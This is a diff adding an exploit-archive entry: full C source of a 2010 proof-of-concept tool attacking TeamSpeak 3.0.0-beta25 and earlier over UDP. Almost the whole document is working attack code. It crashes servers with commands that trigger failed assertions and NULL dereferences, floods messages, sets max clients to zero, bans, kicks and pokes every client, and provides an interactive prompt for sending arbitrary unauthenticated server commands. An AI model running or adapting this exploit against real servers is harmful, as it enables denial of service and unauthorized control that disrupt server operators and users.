@@ -1,0 +1,538 @@
+id: 12842
+date: 06/21/2010
+title: Teamspeak <= 3.0.0-beta25 Multiple Remote Vulnerabilities
+author: Luigi Auriemma
+cves: 
+
+=========================================================
+Teamspeak <= 3.0.0-beta25 Multiple Remote Vulnerabilities
+=========================================================
+
+
+/*
+  by Luigi Auriemma
+*/
+ 
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <time.h>
+ 
+#ifdef WIN32
+    #include <winsock.h>
+    #include "winerr.h"
+ 
+    #define close   closesocket
+    #define sleep   Sleep
+    #define ONESEC  1000
+    #define waitms(x)   sleep(x)
+#else
+    #include <unistd.h>
+    #include <sys/socket.h>
+    #include <sys/types.h>
+    #include <arpa/inet.h>
+    #include <netinet/in.h>
+    #include <netdb.h>
+ 
+    #define ONESEC  1
+    #define stristr strcasestr
+    #define stricmp strcasecmp
+    #define waitms(x)   sleep(x * 1000)
+#endif
+ 
+typedef uint8_t     u8;
+typedef uint16_t    u16;
+typedef uint32_t    u32;
+ 
+ 
+ 
+#define VER         "0.1"
+#define PORT        9987
+#define BUFFSZ      0x400   // max 0x1f4 for "packetType != 1"
+ 
+#define SCAN_MS     40
+#define INIT_TS3    if(sd) close(sd); \
+                    sd = udp_sock(); \
+                    p = buff; \
+                    p += putrr(p, 8);       /* tag */ \
+                    p += putxx(p, 0, 16);   /* header... */ \
+                    p += putxx(p, 0, 16); \
+                    p += putxx(p, 2, 8);    /* packetType 2 is COMMAND */
+ 
+ 
+ 
+static u8 *assert_cmds[] = {
+    "banlist",
+    "complainlist",
+    "servernotifyunregister",
+    "serverrequestconnectioninfo",
+    "setconnectioninfo",
+    "servernotifyregister event=server",
+    NULL
+};
+ 
+static u8 *null_cmds[] = {
+    "bandelall",
+    "channelcreate channel_name=name",
+    "channelsubscribe cid=1",
+    "channelsubscribeall",
+    "banadd ip=1.2.3.4",
+    "clientedit clid=1 client_description=none",
+    "messageupdateflag msgid=1 flag=1",
+    "complainadd tcldbid=1 message=none",
+    "complaindelall tcldbid=1",
+    "ftinitupload clientftfid=1 name=file.txt cid=5 cpw= size=9999 overwrite=1 resume=0",
+    "ftgetfilelist cid=1 cpw= path=\\/",
+    "ftdeletefile cid=1 cpw= name=\\/",
+    "ftcreatedir cid=1 cpw= dirname=\\/",
+    "ftrenamefile cid=1 cpw= tcid=1 tcpw=secret oldname=\\/ newname=\\/",
+    "ftinitdownload clientftfid=1 name=\\/ cid=1 cpw= seekpos=0",
+    NULL
+};
+ 
+static u8 *virtualserver[] = {
+    "virtualserver_antiflood_ban_time",
+    "virtualserver_antiflood_points_needed_ban",
+    "virtualserver_antiflood_points_needed_kick",
+    "virtualserver_antiflood_points_needed_warning",
+    "virtualserver_antiflood_points_tick_reduce",
+    "virtualserver_autostart",
+    "virtualserver_channelsonline",
+    "virtualserver_client_connections",
+    "virtualserver_clientsonline",
+    "virtualserver_complain_autoban_count",
+    "virtualserver_complain_autoban_time",
+    "virtualserver_complain_remove_time",
+    "virtualserver_created",
+    "virtualserver_default_channel_admin_group",
+    "virtualserver_default_channel_group",
+    "virtualserver_default_server_group",
+    "virtualserver_download_quota",
+    "virtualserver_filebase",
+    "virtualserver_flag_password",
+    "virtualserver_hostbanner_gfx_interval",
+    "virtualserver_hostbanner_gfx_url",
+    "virtualserver_hostbanner_url",
+    "virtualserver_hostbutton_gfx_url",
+    "virtualserver_hostbutton_tooltip",
+    "virtualserver_hostbutton_url",
+    "virtualserver_hostmessage",
+    "virtualserver_hostmessage_mode",
+    "virtualserver_icon_id",
+    "virtualserver_id",
+    "virtualserver_keypair",
+    "virtualserver_log_channel",
+    "virtualserver_log_client",
+    "virtualserver_log_filetransfer",
+    "virtualserver_log_permissions",
+    "virtualserver_log_query",
+    "virtualserver_log_server",
+    "virtualserver_machine_id",
+    "virtualserver_max_download_total_bandwidth",
+    "virtualserver_max_upload_total_bandwidth",
+    "virtualserver_maxclients",
+    "virtualserver_min_client_version",
+    "virtualserver_min_clients_in_channel_before_forced_silence",
+    "virtualserver_month_bytes_downloaded",
+    "virtualserver_month_bytes_uploaded",
+    "virtualserver_name_phonetic",
+    "virtualserver_needed_identity_security_level",
+    "virtualserver_password",
+    "virtualserver_platform",
+    "virtualserver_port",
+    "virtualserver_priority_speaker_dimm_modificator",
+    "virtualserver_query_client_connections",
+    "virtualserver_queryclientsonline",
+    "virtualserver_reserved_slots",
+    "virtualserver_total_bytes_downloaded",
+    "virtualserver_total_bytes_uploaded",
+    "virtualserver_total_packetloss_control",
+    "virtualserver_total_packetloss_keepalive",
+    "virtualserver_total_packetloss_speech",
+    "virtualserver_total_packetloss_total",
+    "virtualserver_total_ping",
+    "virtualserver_upload_quota",
+    "virtualserver_uptime",
+    "virtualserver_version",
+    NULL
+};
+ 
+ 
+ 
+int ts3_crypt(unsigned char *key /*includes nonce*/, int hdrlen, unsigned char *data, int data_len, int encrypt);
+int udp_sock(void);
+int putrr(u8 *dst, int len);
+int putmm(u8 *dst, u8 *src, int len);
+int putxx(u8 *data, u32 num, int bits);
+int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err);
+int timeout(int sock, int secs);
+u32 resolv(char *host);
+void std_err(void);
+ 
+ 
+ 
+int main(int argc, char *argv[]) {
+    struct  sockaddr_in peer;
+    int     sd      = 0,
+            i,
+            len,
+            bug;
+    u16     port    = PORT;
+    u8      buff[BUFFSZ],
+            *host,
+            *p;
+ 
+#ifdef WIN32
+    WSADATA    wsadata;
+    WSAStartup(MAKEWORD(1,0), &wsadata);
+#endif
+ 
+    setbuf(stdout, NULL);
+ 
+    fputs("\n"
+        "TeamSpeak 3 <= 3.0.0-beta23 multiple vulnerabilities "VER"\n"
+        "by Luigi Auriemma\n"
+        "e-mail: aluigi@autistici.org\n"
+        "web:    aluigi.org\n"
+        "\n", stdout);
+ 
+    if(argc < 3) {
+        printf("\n"
+            "Usage: %s <bug> <host> [port(%d)]>\n"
+            "\n"
+            "Bugs and some examples:\n"
+            " 1 = interface for sending any custom command\n"
+            " 2 = test the failed assertions\n"
+            " 3 = test the NULL pointer dereferences\n"
+            "\n"
+            " 4 = flooding of random server messages\n"
+            " 5 = set the number of max clients to 0 (USE bug 1 and virtualserver for more)\n"
+            " 6 = ban all the clients currently in the server\n"
+            " 7 = unban all the banned clients\n"
+            " 8 = kick all the clients currently in the server\n"
+            " 9 = send a poke message to all the clients in the server\n"
+            "\n", argv[0], port);
+        exit(1);
+    }
+ 
+    bug  = atoi(argv[1]);
+    host = argv[2];
+    if(argc > 3) port = atoi(argv[3]);
+ 
+    peer.sin_addr.s_addr  = resolv(host);
+    peer.sin_port         = htons(port);
+    peer.sin_family       = AF_INET;
+ 
+    printf("- target   %s : %hu\n",
+        inet_ntoa(peer.sin_addr), port);
+ 
+    if(bug == 1) {
+        printf(
+            "- now you can send and test any command you desire\n"
+            "- refer to doc\\ts3_serverquery_manual.pdf for details and notes!\n"
+            "- use the command \"virtualserver\" for a list of virtualserver parameters to\n"
+            "  change through the \"serveredit\" command (password, banner and so on)\n");
+        for(;;) {
+            printf("\n> ");
+            INIT_TS3
+            fgets(p, BUFFSZ - (p - buff), stdin);
+            for(; *p && (*p != '\r') && (*p != '\n'); p++);
+            *p = 0;
+            if(!strcmp(buff + 8 + 5, "virtualserver")) {
+                printf("\n");
+                for(i = 0; virtualserver[i]; i++) {
+                    printf("  serveredit %s=\n", virtualserver[i]);
+                }
+                printf("\n- refer to doc\\ts3_serverquery_manual.pdf for details and notes\n");
+                continue;
+            }
+ 
+            len = ts3_crypt(NULL, 5, buff, p - buff, 1);
+            while((len = send_recv(sd, buff, len, buff, BUFFSZ, &peer, 0)) > 0) {
+                len = ts3_crypt(NULL, 3, buff, len, 0);
+                buff[len] = 0;
+                printf("- %d %s\n", len, buff + 8 + 3);
+            }
+        }
+    } else if(bug == 2) {
+        printf("- send commands that terminate the server due to failed assertions\n");
+        for(i = 0; assert_cmds[i]; i++) {
+            INIT_TS3
+            p += putmm(p, assert_cmds[i], -1);
+            len = ts3_crypt(NULL, 5, buff, p - buff, 1);
+            if(sendto(sd, buff, len, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in)) != len) break;
+            fputc('.', stdout);
+        }
+    } else if(bug == 3) {
+        printf("- send commands that terminate the server due to failed assertions\n");
+        for(i = 0; null_cmds[i]; i++) {
+            INIT_TS3
+            p += putmm(p, null_cmds[i], -1);
+            len = ts3_crypt(NULL, 5, buff, p - buff, 1);
+            if(sendto(sd, buff, len, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in)) != len) break;
+            fputc('.', stdout);
+        }
+    } else if(bug == 4) {
+        for(;;) {
+            INIT_TS3
+            p += putmm(p, "sendtextmessage targetmode=3 msg=", -1);
+            p += putrr(p, -1);
+            //p += putmm(p, "\\a\\b\\f\\n\\r\\t\\v", -1);
+            len = ts3_crypt(NULL, 5, buff, p - buff, 1);
+            if(sendto(sd, buff, len, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in)) != len) break;
+            fputc('.', stdout);
+            waitms(SCAN_MS);
+        }
+    } else if(bug == 5) {
+        INIT_TS3
+        p += putmm(p, "serveredit virtualserver_maxclients=0", -1);
+        len = ts3_crypt(NULL, 5, buff, p - buff, 1);
+        sendto(sd, buff, len, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in));
+        fputc('.', stdout);
+    } else if(bug == 6) {
+        for(i = 0;; i++) {
+            printf("- ban client id %d\r", i);
+            INIT_TS3
+            p += sprintf(p, "banclient clid=%d", i);
+            len = ts3_crypt(NULL, 5, buff, p - buff, 1);
+            if(sendto(sd, buff, len, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in)) != len) break;
+            fputc('.', stdout);
+            waitms(SCAN_MS);
+        }
+    } else if(bug == 7) {
+        for(i = 0;; i++) {
+            printf("- remove banid %d\r", i);
+            INIT_TS3
+            p += sprintf(p, "bandel banid=%d", i);
+            len = ts3_crypt(NULL, 5, buff, p - buff, 1);
+            if(sendto(sd, buff, len, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in)) != len) break;
+            fputc('.', stdout);
+            waitms(SCAN_MS);
+        }
+    } else if(bug == 8) {
+        for(i = 0;; i++) {
+            printf("- kick client id %d\r", i);
+            INIT_TS3
+            p += sprintf(p, "clientkick clid=%d reasonid=5" /*" reasonmsg=byebye"*/, i);
+            len = ts3_crypt(NULL, 5, buff, p - buff, 1);
+            if(sendto(sd, buff, len, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in)) != len) break;
+            fputc('.', stdout);
+            waitms(SCAN_MS);
+        }
+    } else if(bug == 9) {
+        for(i = 0;; i++) {
+            printf("- send poke message to client id %d\r", i);
+            INIT_TS3
+            p += sprintf(p, "clientpoke clid=%d msg=", i);
+            p += putrr(p, -1);
+            len = ts3_crypt(NULL, 5, buff, p - buff, 1);
+            if(sendto(sd, buff, len, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in)) != len) break;
+            fputc('.', stdout);
+            waitms(SCAN_MS);
+        }
+    } else {
+        printf("\nError: invalid bug number (%d)\n", bug);
+        exit(1);
+    }
+ 
+    printf("\n- done, check the server manually\n");
+    if(sd) close(sd);
+    return(0);
+}
+ 
+ 
+ 
+#include <tomcrypt.h>
+int ts3_crypt(unsigned char *key /*includes nonce*/, int hdrlen, unsigned char *data, int data_len, int encrypt) {
+    static int  already_reg = 0;
+    static const unsigned char default_key[]   = "c:\\windows\\system\\firewall32.cpl";
+    unsigned long   tag = 8;
+    int     err,
+            stat;
+ 
+    if(data_len < (8 + hdrlen)) return(data_len);
+    if(!key) key = (unsigned char *)default_key;
+ 
+    if(!already_reg) {
+        register_cipher(&aes_desc);
+        already_reg = 1;
+    }
+ 
+    #define ts3_crypt_args \
+        0, \
+        key, 16,                                    /* key */ \
+        key + 16, 16,                               /* nonce */ \
+        data + 8, hdrlen,                           /* header */ \
+        data + 8 + hdrlen, data_len - (8 + hdrlen), /* input */ \
+        data + 8 + hdrlen,                          /* output */ \
+        data                                        /* tag */
+ 
+    if(encrypt) {
+        err = eax_encrypt_authenticate_memory(ts3_crypt_args, &tag);
+    } else {
+        err = eax_decrypt_verify_memory(ts3_crypt_args, tag, &stat);
+    }
+    if(err != CRYPT_OK) return(-1);
+    return(data_len);
+}
+ 
+ 
+ 
+int udp_sock(void) {
+    static struct   sockaddr_in *peerl = NULL;
+    static struct   linger  ling = {1,1};
+    static int      on = 1;
+    int     sd;
+ 
+    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if(sd < 0) std_err();
+    setsockopt(sd, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));
+    setsockopt(sd, SOL_SOCKET, SO_BROADCAST, (char *)&on, sizeof(on));
+    //setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on));
+ 
+    // it's necessary a different port for each packet otherwise
+    // the server will wait some seconds before handling the others!
+    if(!peerl) {
+        peerl = malloc(sizeof(struct sockaddr_in));
+        peerl->sin_addr.s_addr = INADDR_ANY;
+        peerl->sin_port        = htons(time(NULL));
+        peerl->sin_family      = AF_INET;
+    }
+    do {
+        peerl->sin_port++;
+    } while(bind(sd, (struct sockaddr *)peerl, sizeof(struct sockaddr_in)) < 0);
+    return(sd);
+}
+ 
+ 
+ 
+int putrr(u8 *dst, int len) {
+    static const char table[] =
+            "0123456789"
+            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+            "abcdefghijklmnopqrstuvwxyz";
+    static int  rnd = 0;
+    int     i,
+            mode = 0;
+ 
+    if(!rnd) rnd = ~time(NULL);
+    if(len < 0) {
+        len = (unsigned)rnd % 100;  // 0x1f4, pokes are max 100 chars
+        mode = 1;
+    }
+    for(i = 0; i < len; i++) {
+        rnd = ((rnd * 0x343FD) + 0x269EC3) >> 1;
+        if(mode) {
+            dst[i] = table[rnd % (sizeof(table) - 1)];
+        } else {
+            dst[i] = rnd;
+        }
+    }
+    return(len);
+}
+ 
+ 
+ 
+int putmm(u8 *dst, u8 *src, int len) {
+    if(len < 0) len = strlen(src);
+    memcpy(dst, src, len);
+    return(len);
+}
+ 
+ 
+ 
+int putxx(u8 *data, u32 num, int bits) {
+    int     i,
+            bytes;
+ 
+    bytes = bits >> 3;
+    for(i = 0; i < bytes; i++) {
+        data[i] = (num >> ((bytes - 1 - i) << 3));
+        //data[i] = (num >> (i << 3));
+    }
+    return(bytes);
+}
+ 
+ 
+ 
+int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err) {
+    int     retry,
+            len;
+ 
+    if(in && !out) {
+        fputc('.', stdout);
+        if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
+          < 0) goto quit;
+        return(0);
+    }
+    if(in) {
+        for(retry = 1; retry; retry--) {    // only one retry
+            fputc('.', stdout);
+            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
+              < 0) goto quit;
+            if(!timeout(sd, 1)) break;
+        }
+ 
+        if(!retry) {
+            if(!err) return(-1);
+            printf("\nError: socket timeout, no reply received\n\n");
+            exit(1);
+        }
+    } else {
+        if(timeout(sd, 1) < 0) return(-1);  // only one second
+    }
+ 
+    fputc('.', stdout);
+    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
+    if(len < 0) goto quit;
+    return(len);
+quit:
+    if(err) std_err();
+    return(-1);
+}
+ 
+ 
+ 
+int timeout(int sock, int secs) {
+    struct  timeval tout;
+    fd_set  fd_read;
+ 
+    tout.tv_sec  = secs;
+    tout.tv_usec = 0;
+    FD_ZERO(&fd_read);
+    FD_SET(sock, &fd_read);
+    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
+      <= 0) return(-1);
+    return(0);
+}
+ 
+ 
+ 
+u32 resolv(char *host) {
+    struct  hostent *hp;
+    u32     host_ip;
+ 
+    host_ip = inet_addr(host);
+    if(host_ip == INADDR_NONE) {
+        hp = gethostbyname(host);
+        if(!hp) {
+            printf("\nError: Unable to resolv hostname (%s)\n", host);
+            exit(1);
+        } else host_ip = *(u32 *)hp->h_addr;
+    }
+    return(host_ip);
+}
+ 
+ 
+ 
+#ifndef WIN32
+    void std_err(void) {
+        perror("\nError");
+        exit(1);
+    }
+#endif
+
+
+
+#  0day.today [2023-03-25]  #
